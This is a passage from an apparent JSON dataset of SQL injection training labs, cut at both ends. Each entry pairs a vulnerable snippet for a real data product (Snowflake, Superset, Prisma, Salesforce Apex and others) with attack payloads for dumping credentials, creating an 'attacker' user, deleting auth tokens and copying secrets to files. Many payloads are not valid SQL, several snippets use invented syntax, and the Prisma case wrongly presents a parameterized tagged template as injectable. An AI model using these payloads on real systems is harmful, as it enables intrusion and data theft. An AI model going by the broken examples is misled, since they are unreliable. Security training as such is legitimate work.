      "Execute arbitrary SQL through range queries",
      "Exfiltrate metrics through injection"
    ],
    "Vulnerability name": "Flux-to-SQL Injection",
    "srcCode": "from(bucket: \"metrics\")\n  |> filter(fn: (r) => r._field == \"${userField}\")\n  |> toSQL()",
    "payloads": [
      "value' OR r._measurement == 'secret_metrics'--",
      "cpu' FROM (SELECT * FROM sql_metrics) x--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate",
    "Lab Description": "A time-series platform creates TimescaleDB continuous aggregates with user-provided refresh policies. The policy parameters are concatenated directly into internal queries, allowing injection during materialization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify continuous aggregate definitions",
      "Inject through refresh policy parameters",
      "Trigger materialization jobs",
      "Bypass time bucket validation",
      "Compromise hypertable data"
    ],
    "Vulnerability name": "Continuous Aggregate Injection",
    "srcCode": "CREATE MATERIALIZED VIEW metrics_agg\nWITH (timescaledb.continuous) AS\nSELECT time_bucket('${userInterval}', time) as bucket,\n  avg(value)\nFROM metrics\nGROUP BY bucket\nWITH NO DATA;",
    "payloads": [
      "1 hour') FROM (SELECT * FROM private_metrics) x--",
      "1 day'::interval) RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB CDC Webhook",
    "Lab Description": "A CockroachDB changefeed sends data to a webhook with SQL-defined filters. The filter expressions are concatenated directly into CDC queries, allowing injection through crafted webhook configurations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify changefeed creation endpoints",
      "Inject through WITH filter parameter",
      "Trigger changefeed events",
      "Bypass CDC validation",
      "Exfiltrate data through webhook payloads"
    ],
    "Vulnerability name": "CDC Webhook Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE users\nINTO 'webhook-https://callback.example.com'\nWITH filter = '${userFilter}';",
    "payloads": [
      "SELECT * FROM users WHERE type = 'admin'--",
      "SELECT *, (SELECT version()) FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQLite FTS5 Extension",
    "Lab Description": "A mobile app uses SQLite's FTS5 extension with user-provided match expressions. The match parameters are concatenated directly into virtual table queries, allowing injection through crafted search terms.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify FTS5 search endpoints",
      "Craft malicious match expression",
      "Bypass tokenizer validation",
      "Execute arbitrary SQL through match syntax",
      "Exfiltrate data through search results"
    ],
    "Vulnerability name": "FTS5 Match Injection",
    "srcCode": "SELECT * FROM docs\nWHERE docs MATCH '${userQuery}';",
    "payloads": [
      "\" OR docid IN (SELECT rowid FROM secrets)--",
      "content:test' AND (SELECT 1 FROM sqlite_master) OR '1'='1"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB External File Import",
    "Lab Description": "A data analysis tool uses DuckDB's file import functionality with user-provided file names. The file path concatenation allows breaking out of import context to execute arbitrary SQL during file scanning.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify file import endpoints",
      "Craft malicious file path with SQL payload",
      "Trigger file scanning process",
      "Bypass file extension validation",
      "Exfiltrate data through import errors"
    ],
    "Vulnerability name": "DuckDB File Import Injection",
    "srcCode": "COPY (SELECT * FROM read_csv('${userFilePath}'))\nTO 'output.parquet';",
    "payloads": [
      "legit.csv') FROM (SELECT * FROM sensitive_data) x--",
      "/tmp/test.csv' WITH (HEADER true)) RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View Refresh Priority",
    "Lab Description": "A data warehouse allows setting refresh priorities for materialized views. The priority parameter is concatenated directly into internal refresh queries, allowing injection during view maintenance operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify materialized view priority settings",
      "Inject through priority parameter",
      "Trigger high-priority refresh",
      "Bypass view dependency checks",
      "Execute commands during refresh"
    ],
    "Vulnerability name": "MV Refresh Priority Injection",
    "srcCode": "ALTER MATERIALIZED VIEW user_stats\nSET REFRESH PRIORITY ${userPriority};",
    "payloads": [
      "100 FROM (SELECT * FROM admin_users) x--",
      "50); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server PolyBase External Table",
    "Lab Description": "A SQL Server instance creates PolyBase external tables with user-provided location parameters. The location string concatenation allows injection during external data source configuration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify external table creation endpoints",
      "Inject through location parameter",
      "Bypass PolyBase validation",
      "Execute commands on linked servers",
      "Exfiltrate data through external tables"
    ],
    "Vulnerability name": "PolyBase External Table Injection",
    "srcCode": "CREATE EXTERNAL TABLE ext_data (\n  id INT,\n  data VARCHAR(100)\n)\nWITH (\n  LOCATION = '${userLocation}',\n  DATA_SOURCE = external_source\n);",
    "payloads": [
      "/data/files') FROM (SELECT * FROM sys.sql_logins) x--",
      "C:\\import\\data.csv'); CREATE USER attacker WITH PASSWORD 'hack'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Remote Function",
    "Lab Description": "A BigQuery implementation calls remote functions with unsanitized parameters. The function arguments are concatenated directly into SQL queries, allowing injection through HTTP endpoint responses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify remote function calls",
      "Craft malicious response containing SQL payload",
      "Bypass BigQuery parameter validation",
      "Execute commands in BigQuery context",
      "Exfiltrate data through function returns"
    ],
    "Vulnerability name": "BigQuery Remote Function Injection",
    "srcCode": "CREATE FUNCTION remote_process(arg STRING)\nRETURNS STRING\nREMOTE WITH CONNECTION remote_conn\nOPTIONS (endpoint = 'https://api.example.com/process?param=${arg}');",
    "payloads": [
      "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
      "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Stage",
    "Lab Description": "A Snowflake pipeline creates external stages with user-provided credentials. The credential string concatenation allows injection during stage creation, compromising cloud storage integrations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify external stage creation endpoints",
      "Inject through credential parameters",
      "Bypass stage validation",
      "Execute commands in cloud provider context",
      "Exfiltrate data through stage operations"
    ],
    "Vulnerability name": "Snowflake Stage Injection",
    "srcCode": "CREATE STAGE my_stage\nURL = 's3://bucket/path/'\nCREDENTIALS = (AWS_KEY_ID = '${userKey}' AWS_SECRET_KEY = '${userSecret}');",
    "payloads": [
      "AKIA123...' FROM (SELECT * FROM information_schema.tables)--",
      "legit_key', AWS_SECRET_KEY = 'secret')) COPY INTO @my_stage FROM (SELECT * FROM sensitive_data)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Notebook Parameter",
    "Lab Description": "A Databricks notebook executes SQL queries with widget parameters. The parameter values are concatenated directly into queries without sanitization, allowing injection through notebook execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify notebook widgets accepting SQL parameters",
      "Inject through widget values",
      "Bypass notebook parameter validation",
      "Execute commands in Databricks context",
      "Exfiltrate data through query results"
    ],
    "Vulnerability name": "Databricks Widget Injection",
    "srcCode": "dbutils.widgets.text(\"input\", \"default\")\nval query = s\"SELECT * FROM table WHERE field = '${dbutils.widgets.get(\"input\")}'\"\nspark.sql(query)",
    "payloads": [
      "1' UNION SELECT * FROM hive_metastore.default.secrets--",
      "test' FROM (SELECT explode(array(1,2,3)))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Catalog Configuration",
    "Lab Description": "A Trino cluster creates catalog configurations with user-provided properties. The property values are concatenated directly into internal queries, allowing injection during catalog initialization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify catalog creation endpoints",
      "Inject through connector properties",
      "Trigger catalog refresh",
      "Bypass Trino security checks",
      "Compromise multiple data sources"
    ],
    "Vulnerability name": "Trino Catalog Injection",
    "srcCode": "CREATE CATALOG my_catalog\nWITH (\n  connector.name = 'postgresql',\n  connection-url = 'jdbc:postgresql://${userHost}:5432/${userDb}',\n  connection-user = '${userUser}',\n  connection-password = '${userPass}'\n);",
    "payloads": [
      "localhost/legit?ssl=true&user=postgres')) FROM (SELECT * FROM system.metadata.catalogs)--",
      "attacker.com/test?user=postgres&password=hack' FROM (SELECT 1) x) OR 1=1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Session Property",
    "Lab Description": "A Presto cluster accepts session properties that modify query execution. The property values are concatenated directly into system queries, allowing injection through client session settings.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify session property endpoints",
      "Inject through property values",
      "Bypass property validation",
      "Modify query execution plans",
      "Exfiltrate data through session changes"
    ],
    "Vulnerability name": "Presto Session Injection",
    "srcCode": "SET SESSION optimize_hash_generation = '${userValue}';",
    "payloads": [
      "true' FROM (SELECT * FROM system.metadata.tables)--",
      "false'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse External Dictionary",
    "Lab Description": "A ClickHouse cluster configures external dictionaries with user-provided source parameters. The configuration values are concatenated directly into dictionary queries, allowing injection during dictionary loading.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify external dictionary definitions",
      "Inject through source configuration",
      "Trigger dictionary reload",
      "Bypass ClickHouse validation",
      "Compromise dictionary data"
    ],
    "Vulnerability name": "ClickHouse Dictionary Injection",
    "srcCode": "CREATE DICTIONARY my_dict (\n  source = POSTGRESQL(\n    host '${userHost}',\n    port 5432,\n    user '${userUser}',\n    password '${userPass}',\n    db '${userDb}',\n    query 'SELECT id, value FROM source_table'\n  )\n);",
    "payloads": [
      "localhost', user 'postgres', password 'hack')) FROM system.dictionaries--",
      "attacker.com', db 'legit', query 'SELECT 1')) COPY TABLE secrets TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Druid SQL Query Context",
    "Lab Description": "A Druid cluster processes SQL queries with user-provided context parameters. The context values are concatenated directly into native Druid queries, allowing injection through query context settings.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify query context parameters",
      "Inject through context values",
      "Bypass Druid SQL validation",
      "Execute native Druid queries",
      "Exfiltrate data through context manipulation"
    ],
    "Vulnerability name": "Druid Context Injection",
    "srcCode": "{\n  \"query\": \"SELECT * FROM datasource\",\n  \"context\": {\n    \"${paramName}\": \"${paramValue}\"\n  }\n}",
    "payloads": [
      "\"sqlTimeZone\": \"UTC' FROM (SELECT * FROM sys.segments) x--\"",
      "\"maxScatterGatherBytes\": \"1000000\"}, {\"malicious\": \"' UNION SELECT * FROM sys.servers--\""
    ]
  },
  {
    "Lab scenario": "SQL Injection in Hive Metastore Partition Filter",
    "Lab Description": "A Hive metastore processes partition filters with user-provided expressions. The filter values are concatenated directly into metastore queries, allowing injection through partition pruning operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify partition filter endpoints",
      "Inject through filter expressions",
      "Bypass Hive validation",
      "Access unauthorized partitions",
      "Exfiltrate metadata through filter injection"
    ],
    "Vulnerability name": "Hive Metastore Injection",
    "srcCode": "SHOW PARTITIONS table PARTITION(${userFilter});",
    "payloads": [
      "dt='2023-01-01') FROM (SELECT * FROM PARTITIONS) x--",
      "category='books' OR (SELECT 1 FROM TBLS) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Impala Admission Control",
    "Lab Description": "An Impala cluster processes admission control rules with user-provided conditions. The condition expressions are concatenated directly into policy queries, allowing injection through resource allocation rules.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify admission control endpoints",
      "Inject through rule conditions",
      "Bypass Impala validation",
      "Modify query prioritization",
      "Exfiltrate data through resource metrics"
    ],
    "Vulnerability name": "Impala Admission Control Injection",
    "srcCode": "CREATE POOL my_pool\nWITH ALLOCATION = 0.5\nWITH QUERY_CONDITION = '${userCondition}';",
    "payloads": [
      "user = 'admin' FROM (SELECT * FROM functional.alltypes) x--",
      "memory > 1000) RETURNING *--"
    ]
  },
  {
      "Lab scenario": "SQL Injection in Apache Superset Dashboard Filters",
      "Lab Description": "A Superset dashboard allows users to save custom filter values that get embedded directly into Jinja-templated SQL queries. The filter value processing fails to properly escape special characters, allowing injection through saved dashboard state.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a dashboard with custom filter",
        "Save filter value containing SQL payload",
        "Share dashboard to trigger query execution",
        "Bypass Jinja template sandbox",
        "Exfiltrate data through filter values"
      ],
      "Vulnerability name": "Superset Filter Injection",
      "srcCode": "SELECT * FROM table WHERE column = '{{ filter_values('saved_filter')[0] }}'",
      "payloads": [
        "' UNION SELECT username, password FROM superset_users--",
        "' || (SELECT table_name FROM information_schema.tables)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in SQLAlchemy Hybrid Properties",
      "Lab Description": "A Flask application uses SQLAlchemy's hybrid_property decorator with unsanitized string formatting. The property expressions get compiled directly into SQL queries, allowing injection through Python attribute access.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify hybrid property methods",
        "Access properties with malicious values",
        "Trigger SQL compilation",
        "Bypass SQLAlchemy parameterization",
        "Execute commands through property access"
      ],
      "Vulnerability name": "SQLAlchemy Hybrid Injection",
      "srcCode": "@hybrid_property\ndef search_query(self):\n    return f\"{self.field} LIKE '%{self.term}%'\"",
      "payloads": [
        "term=' OR 1=1--",
        "field=id) FROM (SELECT * FROM users) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Prisma Raw Query Middleware",
      "Lab Description": "A Next.js application uses Prisma's $queryRaw with unsanitized template literals. The middleware passes raw strings directly to the database driver, allowing injection through GraphQL resolver arguments.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify Prisma raw query endpoints",
        "Inject through GraphQL arguments",
        "Bypass Prisma parameter validation",
        "Execute stacked queries",
        "Exfiltrate schema through errors"
      ],
      "Vulnerability name": "Prisma Raw Query Injection",
      "srcCode": "const users = await prisma.$queryRaw`SELECT * FROM User WHERE email = ${email}`",
      "payloads": [
        "admin@example.com' OR 1=1--",
        "test@test.com' UNION SELECT * FROM Account--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Hasura Event Trigger Headers",
      "Lab Description": "A Hasura GraphQL engine processes event trigger webhook headers with unsanitized SQL interpolation. The header values get embedded directly into trigger processing queries, allowing injection through crafted HTTP headers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Hasura event triggers",
        "Modify webhook request headers",
        "Trigger event processing",
        "Bypass header validation",
        "Compromise the entire GraphQL schema"
      ],
      "Vulnerability name": "Hasura Header Injection",
      "srcCode": "INSERT INTO audit_logs (user_id, action)\nVALUES ('{{headers.user-id}}', '{{headers.action}}')",
      "payloads": [
        "' FROM (SELECT * FROM auth.users) x--",
        "1'); DELETE FROM auth.refresh_tokens--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in DBT Model Configs",
      "Lab Description": "A data transformation pipeline uses user-provided values in dbt model configurations. The config values get interpolated directly into compiled SQL models, allowing injection during dbt runs.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify dbt model configs",
        "Inject through var() references",
        "Trigger dbt compilation",
        "Bypass Jinja templating safeguards",
        "Modify production data models"
      ],
      "Vulnerability name": "DBT Config Injection",
      "srcCode": "SELECT * FROM {{ ref('users') }} \nWHERE department = '{{ var('user_dept') }}'",
      "payloads": [
        "' UNION SELECT * FROM sensitive.schema_versions--",
        "finance' FROM (SELECT * FROM information_schema.tables)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Dagster Asset Materialization",
      "Lab Description": "A Dagster pipeline materializes assets with user-provided metadata. The metadata values get embedded directly into SQL queries during asset recording, allowing injection through op outputs.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify asset materialization ops",
        "Inject through metadata fields",
        "Trigger pipeline execution",
        "Bypass type validation",
        "Compromise the asset catalog"
      ],
      "Vulnerability name": "Dagster Asset Injection",
      "srcCode": "@op\ndef process_data(context, data):\n    yield Materialization(\n        asset_key='user_data',\n        metadata={'size': len(data), 'sql_filter': f'user_id = {context.user}'}\n    )",
      "payloads": [
        "1 UNION SELECT * FROM dagster.runs--",
        "admin' FROM (SELECT * FROM dagster.assets)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Airflow Connection URI",
      "Lab Description": "An Airflow DAG creates database connections with user-provided URIs. The URI parameters get concatenated directly into connection strings, allowing injection during connection pooling.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify connection creation tasks",
        "Inject through URI parameters",
        "Trigger DAG execution",
        "Bypass URI parsing validation",
        "Compromise all database connections"
      ],
      "Vulnerability name": "Airflow URI Injection",
      "srcCode": "PostgresHook(\n    postgres_conn_id='user_db',\n    conn_str=f'postgresql://{user}:{password}@{host}:5432/{dbname}'\n)",
      "payloads": [
        "localhost/test?user=postgres')) FROM (SELECT * FROM information_schema.tables)--",
        "attacker.com/db?user=hacker&password=pwn') RETURNING *--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Metabase Dashboard Subscriptions",
      "Lab Description": "A Metabase instance processes dashboard subscription parameters with unsanitized SQL interpolation. The subscription values get embedded directly into scheduled queries, allowing injection through email alert parameters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create dashboard subscription",
        "Inject through filter parameters",
        "Wait for scheduled execution",
        "Bypass Metabase sandboxing",
        "Exfiltrate data through email content"
      ],
      "Vulnerability name": "Metabase Subscription Injection",
      "srcCode": "SELECT * FROM table \nWHERE {{#filter}}column = '{{.}}'{{/filter}}",
      "payloads": [
        "' UNION SELECT email, password FROM core_user--",
        "1' FROM (SELECT * FROM report_dashboard)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Retool DB Connection Strings",
      "Lab Description": "A Retool application creates database resources with user-provided connection strings. The connection parameters get concatenated directly into JDBC URLs, allowing injection during resource initialization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify DB resource creation points",
        "Inject through connection parameters",
        "Trigger resource testing",
        "Bypass Retool validation",
        "Compromise all connected databases"
      ],
      "Vulnerability name": "Retool Connection Injection",
      "srcCode": "const db = new PostgresqlResource({\n  name: 'user_db',\n  connectionString: `postgresql://${username}:${password}@${host}:5432/${database}`\n})",
      "payloads": [
        "localhost/test?user=admin')) FROM (SELECT * FROM pg_user)--",
        "attacker.com/db?ssl=true&user=hacker') RETURNING *--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Cube.js Pre-Aggregation SQL",
      "Lab Description": "A Cube.js deployment allows user-provided SQL snippets in pre-aggregation definitions. The SQL gets embedded directly into materialization queries, allowing injection through cube schema definitions.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify cube pre-aggregations",
        "Inject through SQL snippets",
        "Trigger pre-aggregation refresh",
        "Bypass Cube.js validation",
        "Compromise the entire OLAP schema"
      ],
      "Vulnerability name": "Cube.js Pre-Agg Injection",
      "srcCode": "preAggregations: {\n  main: {\n    sql: `SELECT * FROM ${CUBE} WHERE ${securityContext.filter}`\n  }\n}",
      "payloads": [
        "1=1) UNION SELECT * FROM cubes--",
        "user_id = 1 FROM (SELECT * FROM cubes.schema)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Snowflake External Function Headers",
      "Lab Description": "A Snowflake external function passes HTTP headers directly into SQL queries during result processing. The header values get concatenated without sanitization, allowing injection through API gateway requests.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify external function calls",
        "Modify request headers",
        "Trigger function execution",
        "Bypass Snowflake parameterization",
        "Exfiltrate data through function results"
      ],
      "Vulnerability name": "Snowflake Header Injection",
      "srcCode": "CREATE EXTERNAL FUNCTION process_data(data STRING)\nRETURNS STRING\nHEADERS = {'user-id': '${context.user}'}\nAPI_INTEGRATION = api_int\nAS 'https://api.example.com/process'",
      "payloads": [
        "' FROM (SELECT * FROM information_schema.tables)--",
        "1'); SELECT system$whitelist()--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Looker Liquid Parameters",
      "Lab Description": "A Looker dashboard uses Liquid templating with user-provided parameters in SQL queries. The parameter interpolation fails to properly escape special characters, allowing injection through dashboard filters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify Liquid parameter endpoints",
        "Inject through filter values",
        "Bypass Looker sandboxing",
        "Execute arbitrary SQL",
        "Exfiltrate data through visualization results"
      ],
      "Vulnerability name": "Looker Liquid Injection",
      "srcCode": "SELECT * FROM table \nWHERE {% condition filter_name %} column = '{{ filter_value }}' {% endcondition %}",
      "payloads": [
        "' UNION SELECT * FROM looker_connections--",
        "1' FROM (SELECT * FROM looker_users)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Tableau Hyper Extract Creation",
      "Lab Description": "A Tableau Server creates Hyper extracts with user-provided SQL queries. The query parameters get concatenated directly into extract generation jobs, allowing injection through published data source configurations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify extract creation endpoints",
        "Inject through query parameters",
        "Trigger extract refresh",
        "Bypass Tableau validation",
        "Compromise the entire Tableau catalog"
      ],
      "Vulnerability name": "Tableau Hyper Injection",
      "srcCode": "CREATE EXTRACT '${extract_path}'\nAS SELECT * FROM ${data_source}\nWHERE ${user_filter}",
      "payloads": [
        "1=1) UNION SELECT * FROM _extracts--",
        "id = 1 FROM (SELECT * FROM _users)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Power BI DirectQuery Parameters",
      "Lab Description": "A Power BI report uses DirectQuery with user-provided parameter values. The parameters get embedded directly into source queries, allowing injection through report filters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify DirectQuery parameters",
        "Inject through report filters",
        "Bypass Power BI parameterization",
        "Execute commands on source database",
        "Exfiltrate data through visual results"
      ],
      "Vulnerability name": "Power BI DirectQuery Injection",
      "srcCode": "let\n  Source = Sql.Database(\"server\", \"db\"),\n  Data = Value.NativeQuery(Source, \"SELECT * FROM table WHERE col = '\" & parameter & \"'\")\nin\n  Data",
      "payloads": [
        "' UNION SELECT * FROM $system.discovery_schema--",
        "1' FROM (SELECT * FROM information_schema.tables)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Google Data Studio Community Connectors",
      "Lab Description": "A Google Data Studio community connector uses user-provided config values in SQL queries. The configuration parameters get concatenated directly into BigQuery jobs, allowing injection through connector settings.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify connector config points",
        "Inject through config parameters",
        "Trigger report execution",
        "Bypass connector validation",
        "Compromise linked BigQuery datasets"
      ],
      "Vulnerability name": "Data Studio Connector Injection",
      "srcCode": "function getData(request) {\n  const query = `SELECT * FROM \\`${request.configParams.dataset}\\`.${request.configParams.table}\n  WHERE ${request.configParams.filter}`;\n  return BigQuery.query(query);\n}",
      "payloads": [
        "dataset.table` WHERE 1=1) UNION SELECT * FROM `dataset.secrets`--",
        "legit_dataset.legit_table` FROM (SELECT * FROM `INFORMATION_SCHEMA.TABLES`)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Salesforce Apex Dynamic SOQL",
      "Lab Description": "A Salesforce Apex controller builds SOQL queries with unsanitized user input. The string concatenation allows breaking out of SOQL context into underlying SQL execution during batch processing.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify dynamic SOQL endpoints",
        "Inject through Visualforce parameters",
        "Trigger batch Apex execution",
        "Bypass SOQL injection protections",
        "Access restricted Salesforce objects"
      ],
      "Vulnerability name": "Salesforce SOQL Injection",
      "srcCode": "public class UserController {\n  public static List<User> getUsers(String filter) {\n    return Database.query('SELECT Id, Name FROM User WHERE ' + filter);\n  }\n}",
      "payloads": [
        "IsActive = true FROM Contact--",
        "Name LIKE '%' FROM (SELECT NamespacePrefix FROM Organization) LIMIT 1--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Oracle APEX Interactive Report SQL",
      "Lab Description": "An Oracle APEX application builds interactive reports with user-modifiable SQL. The source queries get concatenated directly into report generation, allowing injection through column filter parameters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify interactive report regions",
        "Modify column filter values",
        "Trigger report refresh",
        "Bypass APEX escaping mechanisms",
        "Access all application workspace data"
      ],
      "Vulnerability name": "APEX Report Injection",
      "srcCode": "BEGIN\n  apex_util.ir_filter(\n    p_page_id => 1,\n    p_report_column => 'DEPARTMENT',\n    p_filter_value => :P1_FILTER\n  );\nEND;",
      "payloads": [
        "'||(SELECT table_name FROM all_tables WHERE rownum=1)||'",
        "' UNION SELECT username, password FROM apex_workspace_access_users--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in SAP HANA Calculation View Parameters",
      "Lab Description": "A SAP HANA calculation view accepts user-provided parameters in SQL script nodes. The parameter values get embedded directly into script execution, allowing injection through analytical query inputs.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify calculation view parameters",
        "Inject through analytical queries",
        "Bypass HANA script validation",
        "Execute commands in HANA context",
        "Exfiltrate data through calculation results"
      ],
      "Vulnerability name": "HANA Calculation View Injection",
      "srcCode": "CREATE CALCULATION VIEW \"SCHEMA\".\"VIEW\" \nAS SELECT * FROM \"TABLE\" \nWHERE \"COLUMN\" = ${parameter}",
      "payloads": [
        "1 FROM (SELECT * FROM SYS.USERS)--",
        "'1' UNION SELECT * FROM \"_SYS_BIC\".\"M_VIEWS\"--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in IBM Cognos Report Studio SQL",
      "Lab Description": "A Cognos Report Studio report uses dynamic SQL queries with user-provided prompt values. The prompt parameters get concatenated directly into query execution, allowing injection through report filters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify report prompt parameters",
        "Inject through prompt values",
        "Trigger report execution",
        "Bypass Cognos parameterization",
        "Access all content store databases"
      ],
      "Vulnerability name": "Cognos Report Injection",
      "srcCode": "#prompt('param','string')#",
      "payloads": [
        "' UNION SELECT * FROM CMOBJECTS--",
        "1' FROM (SELECT * FROM CMNAMESPACES)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in MicroStrategy Report SQL Pass-Through",
      "Lab Description": "A MicroStrategy report uses SQL pass-through with user-modifiable query fragments. The SQL snippets get concatenated directly into dataset queries, allowing injection through attribute forms.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify SQL pass-through objects",
        "Modify attribute forms",
        "Trigger report execution",
        "Bypass MicroStrategy validation",
        "Compromise the metadata database"
      ],
      "Vulnerability name": "MicroStrategy SQL Pass Injection",
      "srcCode": "SELECT ${attribute_forms} FROM ${logical_table}",
      "payloads": [
        "* FROM (SELECT * FROM MSTR_META.METADATA_ENTITIES) x--",
        "id, name FROM table WHERE 1=1) UNION SELECT * FROM MSTR_USER.USERS--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Qlik Sense Load Script",
      "Lab Description": "A Qlik Sense app uses user-provided parameters in load script SQL queries. The parameter values get embedded directly into script execution, allowing injection through app variables.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify load script variables",
        "Inject through variable input",
        "Reload app data",
        "Bypass Qlik script validation",
        "Access all linked data connections"
      ],
      "Vulnerability name": "Qlik Load Script Injection",
      "srcCode": "SQL SELECT * FROM table WHERE field = '$(varFilter)'",
      "payloads": [
        "' UNION SELECT * FROM CONNECTIONS--",
        "1' FROM (SELECT * FROM SCRIPT_ERRORS)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Alteryx Input Data Tool SQL",
      "Lab Description": "An Alteryx workflow uses the Input Data tool with user-provided SQL queries. The query parameters get concatenated directly into tool configuration, allowing injection through workflow parameters.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Input Data tools",
        "Inject through workflow parameters",
        "Run the workflow",
        "Bypass Alteryx validation",
        "Compromise all database connections"
      ],
      "Vulnerability name": "Alteryx Input Tool Injection",
      "srcCode": "SELECT * FROM ${TableName} WHERE ${FilterCondition}",
      "payloads": [
        "table WHERE 1=1) UNION SELECT * FROM sys.tables--",
        "users WHERE id = 1 FROM (SELECT * FROM sys.databases)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Informatica PowerCenter SQL Transformation",
      "Lab Description": "An Informatica workflow uses SQL Transformation with user-provided query fragments. The query portions get concatenated directly into transformation SQL, allowing injection through parameter files.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify SQL transformations",
        "Modify parameter files",
        "Run the workflow",
        "Bypass Informatica validation",
        "Access repository metadata"
      ],
      "Vulnerability name": "Informatica SQL Transform Injection",
      "srcCode": "SELECT ${columns} FROM ${table} WHERE ${condition}",
      "payloads": [
        "* FROM (SELECT * FROM REP_TABLES) x WHERE 1=1--",
        "id, name FROM users WHERE id = 1) UNION SELECT * FROM OPB_SWIDGINST--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Talend tDBInput Component",
      "Lab Description": "A Talend job uses tDBInput components with user-provided query parameters. The parameter values get concatenated directly into component queries, allowing injection through context variables.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify tDBInput components",
        "Inject through context variables",
        "Execute the job",
        "Bypass Talend escaping",
        "Access all configured connections"
      ],
      "Vulnerability name": "Talend Component Injection",
      "srcCode": "SELECT * FROM \" + context.table_name + \" WHERE \" + context.filter",
      "payloads": [
        "users WHERE 1=1) UNION SELECT * FROM CONTEXTS--",
        "table WHERE id = '1' FROM (SELECT * FROM TALEND_VARIABLES)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Pentaho Data Integration SQL Step",
      "Lab Description": "A Pentaho transformation uses Table Input steps with user-provided SQL fragments. The query portions get concatenated directly into step execution, allowing injection through transformation parameters.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Table Input steps",
        "Inject through parameters",
        "Run the transformation",
        "Bypass Pentaho validation",
        "Access repository databases"
      ],
      "Vulnerability name": "Pentaho SQL Step Injection",
